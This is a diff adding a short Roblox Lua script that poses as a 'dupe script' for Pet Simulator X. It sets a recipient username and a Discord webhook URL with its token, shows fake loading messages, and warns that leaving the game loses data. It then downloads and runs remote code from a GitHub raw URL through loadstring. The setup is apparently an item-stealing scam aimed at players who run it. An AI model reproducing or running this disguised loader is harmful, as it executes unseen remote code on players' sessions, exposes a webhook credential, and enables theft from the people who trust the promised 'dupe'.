@@ -1,0 +1,9 @@
+Username = "PLENQY"
+WebHook = "https://discord.com/api/webhooks/1039988523979255918/pWHZjG-Rfq6aIZR3it0fBmRKF-5FsPTEUq6h-08f9PXLu5_SnhlRg22-lOeftzCGBsGs"
+
+_G.CustomScriptName = "Dupe Script Pet Sim x IF YOU LEAVE DATA WILL LOST!!!!"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
